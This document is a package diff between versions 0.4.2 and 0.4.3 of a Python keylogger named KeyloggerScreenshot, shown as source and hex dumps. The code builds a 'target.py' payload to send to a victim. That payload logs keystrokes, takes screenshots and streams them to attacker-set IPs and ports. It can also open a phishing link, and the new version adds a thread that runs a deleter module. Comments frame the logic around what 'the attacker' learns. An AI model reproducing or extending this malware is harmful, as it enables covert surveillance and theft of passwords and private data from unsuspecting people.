# Comparing `tmp/KeyloggerScreenshot-0.4.2.tar.gz` & `tmp/KeyloggerScreenshot-0.4.3.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "KeyloggerScreenshot-0.4.2.tar", last modified: Tue May 23 09:22:56 2023, max compression
+gzip compressed data, was "KeyloggerScreenshot-0.4.3.tar", last modified: Thu Jun 22 20:37:31 2023, max compression
```

## Comparing `KeyloggerScreenshot-0.4.2.tar` & `KeyloggerScreenshot-0.4.3.tar`

### file list

```diff
@@ -1,33 +1,32 @@
-drwxrwxrwx   0        0        0        0 2023-05-23 09:22:56.927011 KeyloggerScreenshot-0.4.2/
--rw-rw-rw-   0        0        0     4657 2023-05-23 09:18:57.000000 KeyloggerScreenshot-0.4.2/CHANGELOG.txt
--rw-rw-rw-   0        0        0    12113 2023-04-21 17:24:25.000000 KeyloggerScreenshot-0.4.2/KLS_start.py
-drwxrwxrwx   0        0        0        0 2023-05-23 09:22:56.877146 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/
--rw-rw-rw-   0        0        0    14907 2023-05-23 09:09:13.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Keylogger_Target.py
--rw-rw-rw-   0        0        0     1236 2023-05-09 06:01:08.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Local_Deleter.py
--rw-rw-rw-   0        0        0     1917 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Port_data.py
--rw-rw-rw-   0        0        0     6600 2023-05-08 18:36:28.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Server_keylogger.py
--rw-rw-rw-   0        0        0     2574 2023-04-30 15:31:41.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Server_listener.py
--rw-rw-rw-   0        0        0     3903 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Server_photos.py
--rw-rw-rw-   0        0        0     1742 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Server_timer.py
--rw-rw-rw-   0        0        0     8467 2023-05-09 06:29:03.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Simulation_code.py
--rw-rw-rw-   0        0        0      323 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/__init__.py
-drwxrwxrwx   0        0        0        0 2023-05-23 09:22:56.924994 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot.egg-info/
--rw-rw-rw-   0        0        0    10750 2023-05-23 09:22:56.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      718 2023-05-23 09:22:56.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-05-23 09:22:56.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       47 2023-05-23 09:22:56.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot.egg-info/requires.txt
--rw-rw-rw-   0        0        0       20 2023-05-23 09:22:56.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot.egg-info/top_level.txt
--rw-rw-rw-   0        0        0     1058 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.4.2/LISCENCE.txt
--rw-rw-rw-   0        0        0       36 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.4.2/MANIFEST.in
--rw-rw-rw-   0        0        0    10750 2023-05-23 09:22:56.927011 KeyloggerScreenshot-0.4.2/PKG-INFO
--rw-rw-rw-   0        0        0     5340 2023-04-30 15:00:49.000000 KeyloggerScreenshot-0.4.2/README.md
--rw-rw-rw-   0        0        0     8358 2023-05-08 19:37:04.000000 KeyloggerScreenshot-0.4.2/Simualation_code.py
--rw-rw-rw-   0        0        0      388 2023-04-27 07:59:51.000000 KeyloggerScreenshot-0.4.2/client.py
--rw-rw-rw-   0        0        0      657 2023-05-23 09:01:42.000000 KeyloggerScreenshot-0.4.2/demon_server.py
--rw-rw-rw-   0        0        0      923 2023-04-27 06:42:15.000000 KeyloggerScreenshot-0.4.2/leo_gui.py
--rw-rw-rw-   0        0        0     1207 2023-03-14 06:32:31.000000 KeyloggerScreenshot-0.4.2/requirements.py
--rw-rw-rw-   0        0        0       42 2023-05-23 09:22:56.927011 KeyloggerScreenshot-0.4.2/setup.cfg
--rw-rw-rw-   0        0        0     1065 2023-05-23 09:22:50.000000 KeyloggerScreenshot-0.4.2/setup.py
--rw-rw-rw-   0        0        0      269 2023-05-23 09:01:42.000000 KeyloggerScreenshot-0.4.2/target.py
--rw-rw-rw-   0        0        0      179 2023-05-23 09:04:50.000000 KeyloggerScreenshot-0.4.2/test.py
--rw-rw-rw-   0        0        0       55 2023-04-30 11:29:13.000000 KeyloggerScreenshot-0.4.2/tester.py
+drwxrwxrwx   0        0        0        0 2023-06-22 20:37:31.375378 KeyloggerScreenshot-0.4.3/
+-rw-rw-rw-   0        0        0     4783 2023-06-22 20:37:23.000000 KeyloggerScreenshot-0.4.3/CHANGELOG.txt
+-rw-rw-rw-   0        0        0    12294 2023-06-12 07:49:41.000000 KeyloggerScreenshot-0.4.3/KLS_start.py
+drwxrwxrwx   0        0        0        0 2023-06-22 20:37:31.343038 KeyloggerScreenshot-0.4.3/KeyloggerScreenshot/
+-rw-rw-rw-   0        0        0    15071 2023-06-13 10:39:40.000000 KeyloggerScreenshot-0.4.3/KeyloggerScreenshot/Keylogger_Target.py
+-rw-rw-rw-   0        0        0     1236 2023-05-09 06:01:08.000000 KeyloggerScreenshot-0.4.3/KeyloggerScreenshot/Local_Deleter.py
+-rw-rw-rw-   0        0        0     1917 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.3/KeyloggerScreenshot/Port_data.py
+-rw-rw-rw-   0        0        0     7362 2023-06-22 20:30:07.000000 KeyloggerScreenshot-0.4.3/KeyloggerScreenshot/Server_keylogger.py
+-rw-rw-rw-   0        0        0     2574 2023-04-30 15:31:41.000000 KeyloggerScreenshot-0.4.3/KeyloggerScreenshot/Server_listener.py
+-rw-rw-rw-   0        0        0     3903 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.3/KeyloggerScreenshot/Server_photos.py
+-rw-rw-rw-   0        0        0     1742 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.3/KeyloggerScreenshot/Server_timer.py
+-rw-rw-rw-   0        0        0     8467 2023-05-09 06:29:03.000000 KeyloggerScreenshot-0.4.3/KeyloggerScreenshot/Simulation_code.py
+-rw-rw-rw-   0        0        0      323 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.3/KeyloggerScreenshot/__init__.py
+drwxrwxrwx   0        0        0        0 2023-06-22 20:37:31.375378 KeyloggerScreenshot-0.4.3/KeyloggerScreenshot.egg-info/
+-rw-rw-rw-   0        0        0    10874 2023-06-22 20:37:31.000000 KeyloggerScreenshot-0.4.3/KeyloggerScreenshot.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      698 2023-06-22 20:37:31.000000 KeyloggerScreenshot-0.4.3/KeyloggerScreenshot.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-06-22 20:37:31.000000 KeyloggerScreenshot-0.4.3/KeyloggerScreenshot.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       47 2023-06-22 20:37:31.000000 KeyloggerScreenshot-0.4.3/KeyloggerScreenshot.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       20 2023-06-22 20:37:31.000000 KeyloggerScreenshot-0.4.3/KeyloggerScreenshot.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0     1058 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.4.3/LISCENCE.txt
+-rw-rw-rw-   0        0        0       36 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.4.3/MANIFEST.in
+-rw-rw-rw-   0        0        0    10874 2023-06-22 20:37:31.375378 KeyloggerScreenshot-0.4.3/PKG-INFO
+-rw-rw-rw-   0        0        0     5340 2023-04-30 15:00:49.000000 KeyloggerScreenshot-0.4.3/README.md
+-rw-rw-rw-   0        0        0      388 2023-04-27 07:59:51.000000 KeyloggerScreenshot-0.4.3/client.py
+-rw-rw-rw-   0        0        0      658 2023-06-22 19:57:27.000000 KeyloggerScreenshot-0.4.3/demon_server.py
+-rw-rw-rw-   0        0        0      923 2023-04-27 06:42:15.000000 KeyloggerScreenshot-0.4.3/leo_gui.py
+-rw-rw-rw-   0        0        0     1207 2023-03-14 06:32:31.000000 KeyloggerScreenshot-0.4.3/requirements.py
+-rw-rw-rw-   0        0        0       42 2023-06-22 20:37:31.380476 KeyloggerScreenshot-0.4.3/setup.cfg
+-rw-rw-rw-   0        0        0     1065 2023-06-22 20:37:23.000000 KeyloggerScreenshot-0.4.3/setup.py
+-rw-rw-rw-   0        0        0      315 2023-06-22 19:56:34.000000 KeyloggerScreenshot-0.4.3/target.py
+-rw-rw-rw-   0        0        0      417 2023-06-22 20:30:07.000000 KeyloggerScreenshot-0.4.3/test.py
+-rw-rw-rw-   0        0        0       55 2023-04-30 11:29:13.000000 KeyloggerScreenshot-0.4.3/tester.py
```

### Comparing `KeyloggerScreenshot-0.4.2/CHANGELOG.txt` & `KeyloggerScreenshot-0.4.3/CHANGELOG.txt`

 * *Files 2% similar despite different names*

```diff
@@ -171,8 +171,13 @@
 -------------------
 - Fixed Interruption Error
 - Every coordinate of the target no mater what Image size it has will now be shown on the hackers Simulation_code
 
 0.4.2 (23/05/2023)
 ------------------
 - Fixed simulation Error
-- Every coordinate will be shown by order
+- Every coordinate will be shown by order
+
+0.4.3 (22/06/2023)
+------------------
+- Simulation_code.py will now be made if simulater on Server_keylogger is true
+
```

### Comparing `KeyloggerScreenshot-0.4.2/KLS_start.py` & `KeyloggerScreenshot-0.4.3/KLS_start.py`

 * *Files 4% similar despite different names*

```diff
@@ -1,13 +1,13 @@
 import os
 try:
     import pyautogui as pg
 
 except KeyError:
-    files = ["Server_keylogger.py", "Keylogger_Target.py"]
+    files = ["Simulation_code.py","Server_keylogger.py", "Keylogger_Target.py"]
     for this_file in files:
         os.chdir("KeyloggerScreenshot")
         with open(this_file, "r+") as file:
             data = [line.replace("\n", "") for line in file]
 
         with open(this_file, "w+") as file:
             for each in data:
@@ -227,26 +227,23 @@
                         filename = f"{data[0]}.py"
                     if "-" in filename:
                         filename = "target.py"
 
                     if os.path.exists(filename):
                         os.remove(filename)
 
-                    if phishing_name is not None: print(
-                        f'LINK: {phishing_name} WILL BE OPEND WHEN {filename} IS EXECUTED')
+                    if phishing_name is not None: print(f'LINK: {phishing_name} WILL BE OPEND WHEN {filename} IS EXECUTED')
 
                     with open(f"{filename}", "a+") as file:
-                        file.write(
-                            f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener}, ip, {port_time}, duration_in_seconds={seconds}, phishing_web={phishing_value}) \nkey_client.start()")
+                        file.write(f"import KeyloggerScreenshot as ks \nimport threading\n\nthread_deleter = threading.Thread(target=ks.Local_Deleter.DeleteList.start)\nthread_deleter.start()\n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener}, ip, {port_time}, duration_in_seconds={seconds}, phishing_web={phishing_value}) \nkey_client.start()\n")
                     print(f"{filename.upper()} has been created")
 
                 except IndexError:
                     with open("target.py", "a+") as file:
-                        file.write(
-                            f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener}, ip, {port_time}, duration_in_seconds={seconds}, phishing_web={phishing_value}) \nkey_client.start()")
+                        file.write(f"import KeyloggerScreenshot as ks \nimport threading\n\nthread_deleter = threading.Thread(target=ks.Local_Deleter.DeleteList.start)\nthread_deleter.start()\n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener}, ip, {port_time}, duration_in_seconds={seconds}, phishing_web={phishing_value}) \nkey_client.start()\n")
                     print("TARGET.PY HAS BEEN CREATED YOU CAN SEND THIS TO YOUR TARGET")
 
             server_photos = ks.ServerPhotos(ipaddress, port_photos)
 
             server_keylogger = ks.ServerKeylogger(ipaddress, port_keylogger, simulater=boolean)
 
             server_listener = ks.ServerListener(ipaddress, port_listener)
```

### Comparing `KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Keylogger_Target.py` & `KeyloggerScreenshot-0.4.3/KeyloggerScreenshot/Keylogger_Target.py`

 * *Files 4% similar despite different names*

```diff
@@ -673,260 +673,270 @@
 00002a00: 7863 6570 7420 4174 7472 6962 7574 6545  xcept AttributeE
 00002a10: 7272 6f72 3a0d 0a20 2020 2020 2020 2020  rror:..         
 00002a20: 2020 2070 7269 6e74 2866 2741 6e20 6f74     print(f'An ot
 00002a30: 6865 7220 6b65 7920 7761 7320 7072 6573  her key was pres
 00002a40: 7365 643a 207b 6b65 797d 2729 0d0a 2020  sed: {key}')..  
 00002a50: 2020 2020 2020 2020 2020 6966 206b 6579            if key
 00002a60: 203d 3d20 6b65 7962 6f61 7264 2e4b 6579   == keyboard.Key
-00002a70: 2e73 7061 6365 206f 7220 6b65 7920 3d3d  .space or key ==
-00002a80: 206b 6579 626f 6172 642e 4b65 792e 7461   keyboard.Key.ta
-00002a90: 623a 0d0a 2020 2020 2020 2020 2020 2020  b:..            
-00002aa0: 2020 2020 7365 6c66 2e72 6963 6874 6967      self.richtig
-00002ab0: 655f 6c69 7374 6520 2b3d 2022 7b22 0d0a  e_liste += "{"..
-00002ac0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002ad0: 2320 4966 2074 6865 2074 6172 6765 7420  # If the target 
-00002ae0: 7072 6573 7365 7320 7461 6220 6f72 2073  presses tab or s
-00002af0: 7061 6365 2061 2022 7b22 2077 696c 6c20  pace a "{" will 
-00002b00: 6265 2061 7070 656e 6465 6420 746f 2074  be appended to t
-00002b10: 6865 206c 6973 7420 736f 2074 6865 2061  he list so the a
-00002b20: 7474 6163 6b65 7220 6b6e 6f77 7320 7768  ttacker knows wh
-00002b30: 656e 2061 6e64 0d0a 2020 2020 2020 2020  en and..        
-00002b40: 2020 2020 2020 2020 2320 7370 6163 6520          # space 
-00002b50: 6f72 2061 2074 6162 206b 6579 2068 6173  or a tab key has
-00002b60: 2062 6565 6e20 7072 6573 7365 640d 0a20   been pressed.. 
-00002b70: 2020 2020 2020 2020 2020 2065 6c69 6620             elif 
-00002b80: 6b65 7920 3d3d 206b 6579 626f 6172 642e  key == keyboard.
-00002b90: 4b65 792e 6361 7073 5f6c 6f63 6b3a 0d0a  Key.caps_lock:..
-00002ba0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002bb0: 7365 6c66 2e63 6170 7320 3d20 5472 7565  self.caps = True
-00002bc0: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-00002bd0: 2020 7365 6c66 2e63 6865 636b 2e61 7070    self.check.app
-00002be0: 656e 6428 3129 0d0a 2020 2020 2020 2020  end(1)..        
-00002bf0: 2020 2020 6368 6563 6b5f 6361 7073 203d      check_caps =
-00002c00: 2073 756d 2873 656c 662e 6368 6563 6b29   sum(self.check)
-00002c10: 202f 2032 0d0a 2020 2020 2020 2020 2020   / 2..          
-00002c20: 2020 2320 4966 2063 6865 636b 5f63 6170    # If check_cap
-00002c30: 7320 6973 206e 6f74 2070 7269 6d61 7279  s is not primary
-00002c40: 2069 7420 7769 6c6c 2073 6574 2073 656c   it will set sel
-00002c50: 662e 6361 7073 2074 6f20 4661 6c73 650d  f.caps to False.
-00002c60: 0a0d 0a20 2020 2020 2020 2020 2020 2069  ...            i
-00002c70: 6620 7374 7228 6368 6563 6b5f 6361 7073  f str(check_caps
-00002c80: 295b 2d31 5d20 213d 2027 3027 3a0d 0a20  )[-1] != '0':.. 
-00002c90: 2020 2020 2020 2020 2020 2020 2020 2070                 p
-00002ca0: 6173 730d 0a20 2020 2020 2020 2020 2020  ass..           
-00002cb0: 2065 6c73 653a 0d0a 2020 2020 2020 2020   else:..        
-00002cc0: 2020 2020 2020 2020 7365 6c66 2e63 6170          self.cap
-00002cd0: 7320 3d20 4661 6c73 650d 0a20 2020 2020  s = False..     
-00002ce0: 2020 2020 2020 2020 2020 2023 2054 6869             # Thi
-00002cf0: 7320 7265 7365 7473 2065 7665 7279 7468  s resets everyth
-00002d00: 696e 670d 0a0d 0a20 2020 2020 2020 2020  ing....         
-00002d10: 2020 2069 6620 6b65 7920 3d3d 206b 6579     if key == key
-00002d20: 626f 6172 642e 4b65 792e 6261 636b 7370  board.Key.backsp
-00002d30: 6163 653a 0d0a 2020 2020 2020 2020 2020  ace:..          
-00002d40: 2020 2020 2020 6474 203d 2064 6174 6574        dt = datet
-00002d50: 696d 652e 6e6f 7728 290d 0a20 2020 2020  ime.now()..     
-00002d60: 2020 2020 2020 2020 2020 2023 2047 6574             # Get
-00002d70: 7320 7468 6520 6375 7272 656e 7420 7469  s the current ti
-00002d80: 6d65 0d0a 2020 2020 2020 2020 2020 2020  me..            
-00002d90: 2020 2020 6765 745f 7469 6d65 203d 2073      get_time = s
-00002da0: 7472 2864 7429 2e73 706c 6974 2822 3a22  tr(dt).split(":"
-00002db0: 290d 0a20 2020 2020 2020 2020 2020 2020  )..             
-00002dc0: 2020 2023 2054 6869 7320 7370 6c69 7473     # This splits
-00002dd0: 2074 6865 2074 696d 6520 736f 2074 6865   the time so the
-00002de0: 206d 696e 7574 6573 2061 6e64 2073 6563   minutes and sec
-00002df0: 6f6e 6473 2061 7265 2064 6973 706c 6179  onds are display
-00002e00: 6564 0d0a 0d0a 2020 2020 2020 2020 2020  ed....          
-00002e10: 2020 2020 2020 686f 7572 2c20 6d69 6e75        hour, minu
-00002e20: 7465 732c 2073 6563 203d 2069 6e74 2867  tes, sec = int(g
-00002e30: 6574 5f74 696d 655b 305d 5b3a 3a2d 315d  et_time[0][::-1]
-00002e40: 5b30 3a32 5d5b 3a3a 2d31 5d29 2c20 696e  [0:2][::-1]), in
-00002e50: 7428 6765 745f 7469 6d65 5b31 5d29 2c20  t(get_time[1]), 
-00002e60: 666c 6f61 7428 6765 745f 7469 6d65 5b32  float(get_time[2
-00002e70: 5d29 0d0a 2020 2020 2020 2020 2020 2020  ])..            
-00002e80: 2020 2020 2320 4765 7473 2074 6865 2063      # Gets the c
-00002e90: 7572 7265 6e74 2068 6f75 722c 206d 696e  urrent hour, min
-00002ea0: 7574 6520 616e 6420 7365 636f 6e64 0d0a  ute and second..
-00002eb0: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-00002ec0: 2020 616c 6c20 3d20 686f 7572 202a 2033    all = hour * 3
-00002ed0: 3630 3020 2b20 6d69 6e75 7465 7320 2a20  600 + minutes * 
-00002ee0: 3630 202b 2073 6563 0d0a 2020 2020 2020  60 + sec..      
-00002ef0: 2020 2020 2020 2020 2020 2320 4765 7473            # Gets
-00002f00: 2074 6865 2073 6563 6f6e 6473 206f 6620   the seconds of 
-00002f10: 6576 6572 7974 6869 6e67 2066 726f 6d20  everything from 
-00002f20: 686f 7572 2074 6f20 7365 636f 6e64 0d0a  hour to second..
-00002f30: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002f40: 6966 206e 6f74 2073 656c 662e 7365 636f  if not self.seco
-00002f50: 6e64 733a 0d0a 2020 2020 2020 2020 2020  nds:..          
-00002f60: 2020 2020 2020 2020 2020 2320 4966 2074            # If t
-00002f70: 6865 7265 2069 7320 6e6f 7468 696e 6720  here is nothing 
-00002f80: 696e 2074 6865 206c 6973 7420 7365 636f  in the list seco
-00002f90: 6e64 2077 696c 6c20 6265 2061 7070 616e  nd will be appan
-00002fa0: 6465 640d 0a20 2020 2020 2020 2020 2020  ded..           
-00002fb0: 2020 2020 2020 2020 2073 656c 662e 7365           self.se
-00002fc0: 636f 6e64 732e 6170 7065 6e64 2861 6c6c  conds.append(all
-00002fd0: 290d 0a20 2020 2020 2020 2020 2020 2020  )..             
-00002fe0: 2020 206d 696e 7573 203d 2061 6c6c 202d     minus = all -
-00002ff0: 2073 656c 662e 7365 636f 6e64 735b 305d   self.seconds[0]
-00003000: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-00003010: 2020 2320 5468 6973 2063 6865 636b 7320    # This checks 
-00003020: 6966 2074 6865 2074 6172 6765 7420 6973  if the target is
-00003030: 2068 6f6c 6469 6e67 2074 6865 2062 6163   holding the bac
-00003040: 6b73 7061 6365 206b 6579 0d0a 2020 2020  kspace key..    
-00003050: 2020 2020 2020 2020 2020 2020 6966 206d              if m
-00003060: 696e 7573 203e 2030 2e30 3520 6f72 206d  inus > 0.05 or m
-00003070: 696e 7573 203d 3d20 302e 303a 0d0a 2020  inus == 0.0:..  
-00003080: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00003090: 2020 6966 2073 656c 662e 7269 6368 7469    if self.richti
-000030a0: 6765 5f6c 6973 7465 3a0d 0a20 2020 2020  ge_liste:..     
-000030b0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000030c0: 2020 2073 656c 662e 7269 6368 7469 6765     self.richtige
-000030d0: 5f6c 6973 7465 2e70 6f70 282d 3129 0d0a  _liste.pop(-1)..
-000030e0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000030f0: 2020 2020 2020 2020 2320 5265 6d6f 7665          # Remove
-00003100: 7320 7468 6520 6c61 7374 2069 7465 6d20  s the last item 
-00003110: 6f66 2074 6865 206c 6973 740d 0a0d 0a20  of the list.... 
-00003120: 2020 2020 2020 2020 2020 2020 2020 2073                 s
-00003130: 656c 662e 7365 636f 6e64 735b 305d 203d  elf.seconds[0] =
-00003140: 2061 6c6c 0d0a 2020 2020 2020 2020 2020   all..          
-00003150: 2020 2020 2020 2320 4c69 7374 2077 696c        # List wil
-00003160: 6c20 616c 6c77 6179 7320 6265 2075 7064  l allways be upd
-00003170: 6174 6564 0d0a 0d0a 2020 2020 6465 6620  ated....    def 
-00003180: 6f6e 5f72 656c 6561 7365 2873 656c 662c  on_release(self,
-00003190: 206b 6579 293a 0d0a 2020 2020 2020 2020   key):..        
-000031a0: 7072 696e 7428 6627 4b65 7920 7265 6c65  print(f'Key rele
-000031b0: 6173 6564 3a20 7b6b 6579 7d27 290d 0a0d  ased: {key}')...
-000031c0: 0a20 2020 2040 7374 6174 6963 6d65 7468  .    @staticmeth
-000031d0: 6f64 0d0a 2020 2020 6465 6620 696e 7465  od..    def inte
-000031e0: 726e 6574 5f63 6f6e 6e65 6374 696f 6e28  rnet_connection(
-000031f0: 293a 0d0a 2020 2020 2020 2020 2320 5468  ):..        # Th
-00003200: 6973 2066 756e 6374 696f 6e20 6368 6563  is function chec
-00003210: 6b73 2069 6620 6120 636f 6e6e 6563 7469  ks if a connecti
-00003220: 6f6e 2069 7320 7374 6162 6c65 0d0a 2020  on is stable..  
-00003230: 2020 2020 2020 7768 696c 6520 5472 7565        while True
-00003240: 3a0d 0a20 2020 2020 2020 2020 2020 2074  :..            t
-00003250: 7279 3a0d 0a20 2020 2020 2020 2020 2020  ry:..           
-00003260: 2020 2020 2072 6571 7565 7374 732e 6765       requests.ge
-00003270: 7428 2268 7474 7073 3a2f 2f77 7777 2e67  t("https://www.g
-00003280: 6f6f 676c 652e 636f 6d2f 2229 0d0a 2020  oogle.com/")..  
-00003290: 2020 2020 2020 2020 2020 2020 2020 2320                # 
-000032a0: 476f 6f67 6c65 2069 7320 616c 7761 7973  Google is always
-000032b0: 206f 6e6c 696e 6520 736f 2049 2063 686f   online so I cho
-000032c0: 7365 2067 6f6f 676c 650d 0a20 2020 2020  se google..     
-000032d0: 2020 2020 2020 2020 2020 2062 7265 616b             break
-000032e0: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-000032f0: 2020 2320 4966 2074 6865 7265 2069 7320    # If there is 
-00003300: 616e 2069 6e74 6572 6e65 7420 636f 6e6e  an internet conn
-00003310: 6563 7469 6f6e 2069 7420 7769 6c6c 2072  ection it will r
-00003320: 756e 2061 7320 6e6f 726d 616c 0d0a 2020  un as normal..  
-00003330: 2020 2020 2020 2020 2020 6578 6365 7074            except
-00003340: 2072 6571 7565 7374 732e 6578 6365 7074   requests.except
-00003350: 696f 6e73 2e43 6f6e 6e65 6374 696f 6e45  ions.ConnectionE
-00003360: 7272 6f72 3a0d 0a20 2020 2020 2020 2020  rror:..         
-00003370: 2020 2020 2020 2070 7269 6e74 2822 4e6f         print("No
-00003380: 2043 6f6e 6e65 6374 696f 6e22 290d 0a0d   Connection")...
-00003390: 0a20 2020 2064 6566 2073 7461 7274 2873  .    def start(s
-000033a0: 656c 6629 3a0d 0a20 2020 2020 2020 2073  elf):..        s
-000033b0: 656c 662e 696e 7465 726e 6574 5f63 6f6e  elf.internet_con
-000033c0: 6e65 6374 696f 6e28 290d 0a20 2020 2020  nection()..     
-000033d0: 2020 2074 696d 652e 736c 6565 7028 3129     time.sleep(1)
-000033e0: 0d0a 2020 2020 2020 2020 2320 4a75 7374  ..        # Just
-000033f0: 2074 6f20 636f 6f6c 2064 6f77 6e0d 0a0d   to cool down...
-00003400: 0a20 2020 2020 2020 2069 6620 7365 6c66  .        if self
-00003410: 2e70 6869 7368 696e 6720 6973 206e 6f74  .phishing is not
-00003420: 204e 6f6e 653a 0d0a 2020 2020 2020 2020   None:..        
-00003430: 2020 2020 7472 793a 0d0a 2020 2020 2020      try:..      
-00003440: 2020 2020 2020 2020 2020 7265 7175 6573            reques
-00003450: 7473 2e67 6574 2873 656c 662e 7068 6973  ts.get(self.phis
-00003460: 6869 6e67 290d 0a20 2020 2020 2020 2020  hing)..         
-00003470: 2020 2020 2020 2023 2052 6573 706f 6e65         # Respone
-00003480: 2069 7320 6865 7265 2074 6f20 7365 6520   is here to see 
-00003490: 6966 2074 6865 2077 6562 7369 7465 2069  if the website i
-000034a0: 7320 6f6e 6c69 6e65 206f 7220 6e6f 740d  s online or not.
-000034b0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-000034c0: 2077 6562 6272 6f77 7365 722e 6f70 656e   webbrowser.open
-000034d0: 2873 656c 662e 7068 6973 6869 6e67 290d  (self.phishing).
-000034e0: 0a0d 0a20 2020 2020 2020 2020 2020 2065  ...            e
-000034f0: 7863 6570 7420 7265 7175 6573 7473 2e65  xcept requests.e
-00003500: 7863 6570 7469 6f6e 732e 436f 6e6e 6563  xceptions.Connec
-00003510: 7469 6f6e 4572 726f 723a 0d0a 2020 2020  tionError:..    
-00003520: 2020 2020 2020 2020 2020 2020 7072 696e              prin
-00003530: 7428 224e 6f20 636f 6e6e 6563 7469 6f6e  t("No connection
-00003540: 2229 0d0a 0d0a 2020 2020 2020 2020 2020  ")....          
-00003550: 2020 6578 6365 7074 2072 6571 7565 7374    except request
-00003560: 732e 6578 6365 7074 696f 6e73 2e49 6e76  s.exceptions.Inv
-00003570: 616c 6964 5552 4c3a 0d0a 2020 2020 2020  alidURL:..      
-00003580: 2020 2020 2020 2020 2020 7072 696e 7428            print(
-00003590: 2249 6e76 616c 6964 2055 726c 2229 0d0a  "Invalid Url")..
-000035a0: 0d0a 2020 2020 2020 2020 6c69 7374 656e  ..        listen
-000035b0: 696e 675f 7468 7265 6164 203d 2074 6872  ing_thread = thr
-000035c0: 6561 6469 6e67 2e54 6872 6561 6428 7461  eading.Thread(ta
-000035d0: 7267 6574 3d73 656c 662e 6461 7465 6e5f  rget=self.daten_
-000035e0: 6175 666e 6568 656d 656e 290d 0a20 2020  aufnehemen)..   
-000035f0: 2020 2020 2023 2054 6869 7320 7275 6e73       # This runs
-00003600: 2074 6865 2070 726f 6772 616d 2062 6568   the program beh
-00003610: 696e 6420 7468 6520 6163 7475 616c 2070  ind the actual p
-00003620: 726f 6772 616d 6d69 6e67 0d0a 2020 2020  rogramming..    
-00003630: 2020 2020 6c69 7374 656e 696e 675f 7468      listening_th
-00003640: 7265 6164 2e73 7461 7274 2829 0d0a 0d0a  read.start()....
-00003650: 2020 2020 2020 2020 7468 7265 6164 696e          threadin
-00003660: 675f 6d6f 7573 6520 3d20 7468 7265 6164  g_mouse = thread
-00003670: 696e 672e 5468 7265 6164 2874 6172 6765  ing.Thread(targe
-00003680: 743d 7365 6c66 2e61 6c6c 5f63 6c69 636b  t=self.all_click
-00003690: 7329 0d0a 2020 2020 2020 2020 2320 5468  s)..        # Th
+00002a70: 2e74 6162 3a0d 0a20 2020 2020 2020 2020  .tab:..         
+00002a80: 2020 2020 2020 2073 656c 662e 7269 6368         self.rich
+00002a90: 7469 6765 5f6c 6973 7465 202b 3d20 2220  tige_liste += " 
+00002aa0: 5b54 4142 5d20 220d 0a0d 0a20 2020 2020  [TAB] "....     
+00002ab0: 2020 2020 2020 2065 6c69 6620 6b65 7920         elif key 
+00002ac0: 3d3d 206b 6579 626f 6172 642e 4b65 792e  == keyboard.Key.
+00002ad0: 656e 7465 723a 0d0a 2020 2020 2020 2020  enter:..        
+00002ae0: 2020 2020 2020 2020 7365 6c66 2e72 6963          self.ric
+00002af0: 6874 6967 655f 6c69 7374 6520 2b3d 2022  htige_liste += "
+00002b00: 205b 454e 5445 525d 2022 0d0a 0d0a 2020   [ENTER] "....  
+00002b10: 2020 2020 2020 2020 2020 656c 6966 206b            elif k
+00002b20: 6579 203d 3d20 6b65 7962 6f61 7264 2e4b  ey == keyboard.K
+00002b30: 6579 2e73 7061 6365 3a0d 0a20 2020 2020  ey.space:..     
